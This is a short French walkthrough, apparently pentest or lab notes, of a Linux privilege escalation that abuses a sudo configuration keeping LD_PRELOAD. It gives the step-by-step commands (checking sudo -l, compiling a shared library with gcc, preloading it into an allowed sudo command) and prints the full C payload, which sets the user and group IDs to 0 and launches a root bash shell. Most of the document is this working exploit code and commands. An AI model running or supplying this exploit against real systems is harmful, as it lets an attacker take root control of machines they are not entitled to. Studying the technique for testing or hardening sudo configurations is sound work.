1. **Vérifier les droits sudo :**

- Commande : `sudo -l`
- Lorsque `env_keep+=LD_PRELOAD` est présent dans la configuration de sudo, cela signifie que la variable d'environnement `LD_PRELOAD` est conservée lors de l'exécution des commandes avec `sudo`.

2. **Créer le fichier source C (root.c) :**

- Commande : `nano -w /tmp/root.c`
- Le code C crée une bibliothèque partagée qui, lorsqu'elle est chargée, exécute son code d'initialisation (`_init()`). Ce code modifie l'ID utilisateur (UID) et l'ID de groupe (GID) du processus en 0 (c'est-à-dire `root`), puis lance un shell Bash.

3. **Compiler le fichier source en bibliothèque partagée :**

- Commande : `gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles`
- Cette commande compile le fichier `root.c` en une bibliothèque partagée `root.so`. L'option `-fPIC` crée du code position indépendant, nécessaire pour les bibliothèques partagées, et `-nostartfiles` empêche gcc d'utiliser les fichiers de démarrage standard, ce qui n'est pas nécessaire pour ce type de charge utile.

4. **Exécuter une commande avec `sudo` en utilisant `LD_PRELOAD` :**

- Commande : `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/executable restart`
- Ici, `LD_PRELOAD` est utilisé pour précharger `root.so`. Lorsque la commande `/usr/sbin/executable` (qui doit être une commande autorisée par `sudo`) est exécutée, elle charge `root.so` avant toute autre bibliothèque. Cela entraîne l'exécution du code dans `_init()`, élevant ainsi les privilèges du processus à ceux de `root`.


Contenu de root.c:

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
